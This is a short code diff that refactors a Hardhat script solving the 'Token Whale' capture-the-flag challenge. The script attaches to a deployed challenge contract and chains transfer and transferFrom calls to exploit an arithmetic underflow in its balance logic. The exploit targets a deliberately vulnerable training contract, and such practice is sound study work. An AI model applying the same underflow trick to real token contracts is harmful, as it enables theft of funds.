@@ -1,11 +1,11 @@
-import { task } from "hardhat/config";
+import { ethers } from "hardhat";
 
 const contractAddress = "0xc80aB8aE419916AE06cB07f6Edc285df1cAB54A6";
 
-task("token-whale", "Solves the 'Token Whale' challenge", async (_taskArgs, hre) => {
-  const [user1, user2] = await hre.ethers.getSigners();
+async function main() {
+  const [user1, user2] = await ethers.getSigners();
 
-  const challengeFactory = await hre.ethers.getContractFactory("TokenWhaleChallenge");
+  const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge");
   const challengeContract = challengeFactory.attach(contractAddress);
 
   const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
@@ -16,4 +16,9 @@ task("token-whale", "Solves the 'Token Whale' challenge", async (_taskArgs, hre)
 
   const transferFromTx = await challengeContract.connect(user1).transferFrom(user2.address, user2.address, 501);
   await transferFromTx.wait();
+}
+
+main().catch(error => {
+  console.error(error);
+  process.exit(1);
 });
